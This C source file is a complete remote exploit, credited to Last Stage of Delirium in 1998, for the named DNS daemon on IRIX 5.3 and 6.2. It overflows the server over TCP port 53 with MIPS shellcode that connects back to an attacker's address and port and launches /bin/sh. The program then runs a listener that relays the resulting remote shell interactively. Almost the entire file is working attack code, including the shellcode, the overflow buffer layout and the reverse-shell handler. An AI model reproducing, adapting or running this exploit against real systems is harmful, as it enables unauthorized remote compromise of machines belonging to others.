/*## copyright LAST STAGE OF DELIRIUM may 1998 poland        *://lsd-pl.net/ #*/
/*## named                                                                   #*/

/*   usage ./r local_adr local_port target                                    */
/*   you must specify the local_adr and local_port since                      */
/*   the remote shell is a connecting shell not a classic                     */
/*   bind shell (it connects with the local machine)                          */

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netdb.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>

#define START_ADR	0x10040100	

#define PUTADR(p,adr) {*p=(adr>>24)&0xff;*(p+1)=(adr>>16)&0xff;*(p+2)=(adr>>8)&0xff;*(p+3)=adr&0xff;}

#define PUTADRH(p,adr) {*p=(adr>>24)&0xff;*(p+1)=(adr>>16)&0xff;}
#define PUTADRL(p,adr) {*p=(adr>>8)&0xff;*(p+1)=adr&0xff;}

char tablica[25]={
    0x00,0x00,0x34,0x34,0x09,0x80,0x00,0x00,
    0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x01,0x20,0x20,0x20,0x20,0x00,
    0x00
};

char asmcode[]={
    "\x24\x04\x00\x02"       /* li      $a0,2              */ 
    "\x24\x05\x00\x02"       /* li      $a1,2              */
    "\x24\x06\x00\x00"       /* li      $a2,0              */
    "\x24\x02\x04\x53"       /* li      $v0,1107           */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x00\x40\x80\x25"       /* move    $s0,$v0            */
    "\x00\x40\x20\x25"       /* move    $a0,$v0            */
    "\x3c\x05\x10\x04"       /* lui     $a1,0x1004         */
    "\x34\xa5\xff\xff"       /* ori     $a1,$a1,0xffff     */ 
    "\x24\x06\x00\x10"       /* li      $a2,16             */
    "\x24\x02\x04\x43"       /* li      $v0,1091           */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x24\x02\x03\xee"       /* li      $v0,1006           */
    "\x24\x04\x00\x00"       /* li      $a0,0              */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x24\x02\x03\xee"       /* li      $v0,1006           */
    "\x24\x04\x00\x01"       /* li      $a0,1              */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x24\x02\x03\xee"       /* li      $v0,1006           */
    "\x24\x04\x00\x02"       /* li      $a0,2              */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x02\x00\x20\x25"       /* move    $a0,$s0            */
    "\x24\x02\x04\x11"       /* li      $v0,1041           */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x02\x00\x20\x25"       /* move    $a0,$s0            */
    "\x24\x02\x04\x11"       /* li      $v0,1041           */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x02\x00\x20\x25"       /* move    $a0,$s0            */
    "\x24\x02\x04\x11"       /* li      $v0,1041           */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "\x3c\x04\x10\x01"       /* lui     $a0,0x1001         */
    "\x34\x84\xff\xf1"       /* ori     $a0,$a0,0xfff1     */
    "\x3c\x05\x10\x02"       /* lui     $a1,0x1002         */
    "\x34\xa5\xff\xf2"       /* ori     $a1,$a1,0xfff2     */
    "\x24\x02\x03\xf3"       /* li      $v0,1011           */
    "\x00\x00\x00\x0c"       /* syscall                    */
    "\x00\x00\x00\x00"       /* nop                        */
    "/bin/sh\x00"  
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x02\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00"
    "\x00\x00\x00\x00" 
};

main(int argc,char **argv){
    int sck,i,srvsck;
    fd_set readfs;
    struct sockaddr_in address;
    struct sockaddr_in local;
    struct hostent *hp;
    int size;
    unsigned long lregt9,lreggp,lstart,lbcop7,ltmp;
    char regt9[4],reggp[4],start[4],bcop7[4];	
    char *b,*p;

    printf("copyright LAST STAGE OF DELIRIUM may 1998 poland  //lsd-pl.net/\n");
    printf("named for irix 5.3 6.2 IP:??\n\n");

    if(argc!=4){
        printf("usage: %s local_adr local_port target\n",argv[0]);exit(1);
    }

    srvsck=socket(AF_INET,SOCK_STREAM,0);

    bzero(&local,sizeof(local));
    local.sin_family=AF_INET;
    local.sin_port=htons(atoi(argv[2]));
    if((local.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            printf("error: address.\n");exit(-1);
        }
        memcpy(&local.sin_addr.s_addr,hp->h_addr,4);
    }
    if (bind(srvsck,(struct sockaddr *)&local,sizeof(local))<0) {
       perror("error");exit(-1);
     } 

    lbcop7=lregt9=START_ADR;
    lstart=START_ADR+0x14;	
    lreggp=START_ADR+0x8024;	
    PUTADR(regt9,lregt9);
    PUTADR(reggp,lreggp);
    PUTADR(start,lstart);
    PUTADR(bcop7,lbcop7);

    ltmp=START_ADR+0xd8;
    PUTADRH(&asmcode[0x34-20+2],ltmp);
    PUTADRL(&asmcode[0x38-20+2],ltmp);
    ltmp=START_ADR+0xc8;
    PUTADRH(&asmcode[0xa8-20+2+4],ltmp);
    PUTADRL(&asmcode[0xac-20+2+4],ltmp);
    PUTADR(&asmcode[0xcc-20+4],ltmp);
    ltmp=START_ADR+0xd0;
    PUTADRH(&asmcode[0xb0-20+2+4],ltmp);
    PUTADRL(&asmcode[0xb4-20+2+4],ltmp);
    ltmp=local.sin_addr.s_addr;
    PUTADR(&asmcode[0xdc-20],ltmp);
    ltmp=local.sin_port;
    PUTADRL(&asmcode[0xda-20],ltmp);

    size=930;
    tablica[0]=(size+23)>>8;
    tablica[1]=(size+23)&0xff;
    tablica[23]=size>>8;
    tablica[24]=size&0xff;

    if((b=(char*)malloc(10500))==NULL) return(-1);
    memset(b,0,10500);
    bcopy(tablica,b,sizeof(tablica));

    for(i=0;i<sizeof(asmcode);i++)
      b[2+32+i]=asmcode[i];
    for(i=0;i<4;i++){
      b[2+200+420+i]=start[i];
      b[2+200+420+420+i]=regt9[i];
      b[1018+i]=reggp[i];
      b[930+i]=bcop7[i];
      b[1018-(7*8+4)+i]=regt9[i];
    }
    b[968]=0x20;
    b[528]=0x08;

    sck=socket(AF_INET,SOCK_STREAM,0);

    bzero(&address,sizeof(address));
    address.sin_family=AF_INET;
    address.sin_port=htons(53);
    if((address.sin_addr.s_addr=inet_addr(argv[3]))==-1){
        if((hp=gethostbyname(argv[3]))==NULL){
            printf("error: address.\n");exit(-1);
        }
        memcpy(&address.sin_addr.s_addr,hp->h_addr,4);
    }


    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){
        perror("error");exit(-1);
    }
    fflush(stdout);

    write(sck,b,25+size);
    close(sck);

    size=10000;
    b[0]=(size+23)>>8;
    b[1]=(size+23)&0xff;
    b[23]=size>>8;
    b[24]=size&0xff;

    sck=socket(AF_INET,SOCK_STREAM,0);
    sleep(1);
    if(connect(sck,(struct sockaddr *)&address,sizeof(address))<0){
        perror("error");exit(-1);
    }
    fflush(stdout);
    write(sck,b,25+size);
    close(sck);

    listen(srvsck,5);
    srvsck=accept(srvsck,(struct sockaddr*)&local,&i);
    printf("%s successfully exploited\n",argv[3]); 
    fflush(stdout);
    while(1){
        FD_ZERO(&readfs);
        FD_SET(0,&readfs);
        FD_SET(srvsck,&readfs);   
        if(select(FD_SETSIZE,&readfs,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&readfs)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; 
                    else {printf("koniec.\n");exit(-1);}
                }
                write(srvsck,buf,cnt);
            }
            if(FD_ISSET(srvsck,&readfs)){
                if((cnt=read(srvsck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue; 
                    else {printf("koniec.\n");exit(-1);}
                }
                write(1,buf,cnt);
            }
        }
    }
   free(b);
   close(srvsck);
}

